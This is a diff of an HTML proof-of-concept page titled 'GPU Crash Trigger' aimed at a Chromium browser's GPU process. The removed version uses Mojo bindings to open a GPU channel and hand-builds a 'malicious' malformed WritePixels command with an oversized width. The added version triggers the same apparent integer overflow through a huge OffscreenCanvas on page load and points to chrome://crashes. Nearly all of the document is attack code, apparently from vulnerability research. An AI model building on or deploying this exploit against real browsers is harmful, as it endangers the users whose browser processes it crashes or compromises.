@@ -1,74 +1,29 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>GPU Crash Trigger</h1>
-    <canvas id="target-canvas" width="10" height="10"></canvas>
-    
-    <script type="module">
-        import { mojo } from './gen/mojo/public/js/bindings.js';
-        window.mojo = mojo;
-        window.mojo.config = { autoLoadMojomDeps: false };
-
-        // Polyfills for legacy mojom files
-        window.mojo.internal.isMojomLoaded = () => false;
-        window.mojo.internal.markMojomLoaded = () => {};
-        window.mojo.internal.loadMojomIfNecessary = () => {};
-        window.mojo.internal.exposeNamespace = (ns) => {
-            let parts = ns.split('.');
-            let p = window;
-            for(let part of parts) { if(!p[part]) p[part]={}; p=p[part]; }
-            return p;
-        };
-
-        const script = document.createElement('script');
-        script.src = './gen/services/viz/public/mojom/gpu.mojom.js';
-        script.onload = async () => {
-            console.log("[+] viz.mojom.Gpu loaded.");
-            
-            // 1. Establish GPU Channel to get the handle
-            let gpuPtr = new viz.mojom.GpuPtr();
-            Mojo.bindInterface(viz.mojom.Gpu.name, mojo.makeRequest(gpuPtr).handle, "context");
-            
-            console.log("[*] Requesting GPU Channel...");
-            let response = await gpuPtr.establishGpuChannel();
-            console.log("[+] Channel established! Client ID: " + response.clientId);
-            
-            // 2. Build the malicious 60-byte payload
-            // ID 277 = kWritePixelsINTERNALImmediate
-            const CMD_ID = 277;
-            const WORDS = 15;
-            let buffer = new ArrayBuffer(WORDS * 4);
-            let dv = new DataView(buffer);
-            
-            dv.setUint32(0, (WORDS << 21) | CMD_ID, true); // Header
-            dv.setInt32(4, 0, true);   // x_offset
-            dv.setInt32(8, 0, true);   // y_offset
-            dv.setUint32(12, 0x20000000, true); // TRIGGER: src_width
-            dv.setUint32(16, 1, true);          // src_height
-            dv.setUint32(20, 0, true);          // src_row_bytes
-            dv.setUint32(24, 4, true);          // src_sk_color_type
-            dv.setUint32(28, 2, true);          // src_sk_alpha_type
-            dv.setInt32(32, 1, true);           // shm_id (using 1 as default)
-            dv.setUint32(36, 0, true);          // shm_offset
-            dv.setUint32(40, 0, true);          // pixels_offset
-            new Uint8Array(buffer).fill(0, 44, 60); // Mailbox zeros
-
-            // 3. Inject into the GPU process
-            // In a real exploit, you'd write this to the mapped ring buffer.
-            // Sending it here will trigger the decoder to parse this struct.
-            console.log("[!] Payload constructed. Now sending to GPU...");
-            
-            // Note: If this doesn't crash, the GPU process is validating the command 
-            // structure before it reaches the vulnerable function.
-            // The crash happens when the Decoder parses this malformed WritePixels.
-            
-            const canvas = document.getElementById('target-canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.fillRect(0,0,10,10);
-            
-            console.log("[+] Done. Check chrome://crashes for your Crash ID.");
-        };
-        document.head.appendChild(script);
+    <script>
+        async function triggerCrash() {
+            try {
+                // 0x20000000 width * 4 bytes = 0x80000000 bytes (2GB)
+                // This targets the exact overflow we found in the assembly.
+                const width = 0x20000000;
+                const height = 1;
+                
+                console.log("[*] Initializing OffscreenCanvas with width:", width.toString(16));
+                
+                const canvas = new OffscreenCanvas(width, height);
+                const ctx = canvas.getContext('2d');
+                
+                // This triggers the RasterDecoder via the GPU Command Buffer
+                const bitmap = canvas.transferToImageBitmap();
+                
+                console.log("[!] Trigger sent. Check chrome://crashes");
+            } catch (e) {
+                console.error("[-] Caught: " + e.message);
+            }
+        }
+        
+        setTimeout(triggerCrash, 1000);
     </script>
 </body>
 </html>
